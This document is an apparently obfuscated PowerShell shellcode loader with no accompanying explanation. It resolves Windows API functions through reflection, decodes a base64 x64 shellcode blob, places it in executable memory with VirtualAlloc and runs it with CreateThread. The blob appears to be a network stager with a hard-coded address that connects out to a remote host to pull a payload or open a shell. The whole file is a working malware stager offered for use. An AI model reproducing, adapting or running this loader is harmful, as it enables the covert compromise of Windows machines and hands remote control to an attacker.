function wwd {
	Param ($aOC63, $uStt)		
	$tK = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	
	return $tK.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($tK.GetMethod('GetModuleHandle')).Invoke($null, @($aOC63)))), $uStt))
}

function t6m {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $ykFq,
		[Parameter(Position = 1)] [Type] $v4T = [Void]
	)
	
	$lvfjB = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$lvfjB.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $ykFq).SetImplementationFlags('Runtime, Managed')
	$lvfjB.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $v4T, $ykFq).SetImplementationFlags('Runtime, Managed')
	
	return $lvfjB.CreateType()
}

[Byte[]]$wyKe = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCANJiZy6AL0FUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1WoKQV5QUE0xyU0xwEj/wEiJwkj/wEiJwUG66g/f4P/VSInHahBBWEyJ4kiJ+UG6maV0Yf/VhcB0Ckn/znXl6JMAAABIg+wQSIniTTHJagRBWEiJ+UG6AtnIX//Vg/gAflVIg8QgXon2akBBWWgAEAAAQVhIifJIMclBulikU+X/1UiJw0mJx00xyUmJ8EiJ2kiJ+UG6AtnIX//Vg/gAfShYQVdZaABAAABBWGoAWkG6Cy8PMP/VV1lBunVuTWH/1Un/zuk8////SAHDSCnGSIX2dbRB/+dYagBZScfC8LWiVv/V")
		
$i2b = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((wwd kernel32.dll VirtualAlloc), (t6m @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $wyKe.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($wyKe, 0, $i2b, $wyKe.length)

$yXh = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((wwd kernel32.dll CreateThread), (t6m @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$i2b,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((wwd kernel32.dll WaitForSingleObject), (t6m @([IntPtr], [Int32]))).Invoke($yXh,0xffffffff) | Out-Null
